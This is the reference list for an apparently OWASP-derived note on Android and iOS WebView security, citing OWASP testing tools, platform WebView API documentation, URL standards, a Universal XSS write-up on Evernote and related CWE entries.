- OWASP MASTG tools: [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/), [radare2 (MASTG-TOOL-0073)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/), [rabin2 (MASTG-TOOL-0129)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/), [Frida (Android) (MASTG-TOOL-0001)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0001/), [Frida (iOS) (MASTG-TOOL-0039)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/), [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/), [Apktool (MASTG-TOOL-0011)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0011/) (CC BY-SA 4.0)
- Android Developers: [`WebViewClient`](https://developer.android.com/reference/android/webkit/WebViewClient) (`shouldOverrideUrlLoading`, `shouldInterceptRequest`, `onSafeBrowsingHit`), [`WebView`](https://developer.android.com/reference/android/webkit/WebView) (`loadUrl`, `loadData`, `loadDataWithBaseURL`, `setSafeBrowsingWhitelist`, `startSafeBrowsing`), [`WebSettings.setSafeBrowsingEnabled`](https://developer.android.com/reference/android/webkit/WebSettings#setSafeBrowsingEnabled%28boolean%29), [Manage WebView objects: Google Safe Browsing Service](https://developer.android.com/develop/ui/views/layout/webapps/managing-webview), [Unsafe URI loading](https://developer.android.com/privacy-and-security/risks/unsafe-uri-loading), [Cross-app scripting](https://developer.android.com/privacy-and-security/risks/cross-app-scripting), [Load in-app content with WebViewAssetLoader](https://developer.android.com/develop/ui/views/layout/webapps/load-local-content), [Trusted Web Activities](https://developer.android.com/develop/ui/views/layout/webapps/trusted-web-activities); Chrome Developers: [Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs/overview/)
- Apple: [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview), [`WKNavigationDelegate`](https://developer.apple.com/documentation/webkit/wknavigationdelegate), [`WKWebViewConfiguration.limitsNavigationsToAppBoundDomains`](https://developer.apple.com/documentation/webkit/wkwebviewconfiguration/limitsnavigationstoappbounddomains), [`WKAppBoundDomains`](https://webkit.org/blog/10882/app-bound-domains/), [`WKWebpagePreferences.allowsContentJavaScript`](https://developer.apple.com/documentation/webkit/wkwebpagepreferences/allowscontentjavascript), [`SFSafariViewController`](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller), [`ASWebAuthenticationSession`](https://developer.apple.com/documentation/authenticationservices/aswebauthenticationsession), [`UIWebView`](https://developer.apple.com/documentation/uikit/uiwebview), [Updating Apps that Use Web Views (Apple Developer News, 23 December 2019)](https://developer.apple.com/news/?id=12232019b); WebKit blog: [App-Bound Domains](https://webkit.org/blog/10882/app-bound-domains/)
- [Google Safe Browsing](https://developers.google.com/safe-browsing/); [WHATWG URL Standard](https://url.spec.whatwg.org/) (backslash handling in special schemes); [RFC 3986: URI Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986)
- Oversecured: [Evernote: Universal XSS, theft of all cookies from all sites, and more](https://oversecured.com/blog/evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more), as referenced by OWASP MASWE-0035
- [Frida](https://frida.re/docs/home/), [mitmproxy documentation](https://docs.mitmproxy.org/stable/), [radare2 book](https://book.rada.re/)
- CWE: [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [CWE-601](https://cwe.mitre.org/data/definitions/601.html), [CWE-829](https://cwe.mitre.org/data/definitions/829.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
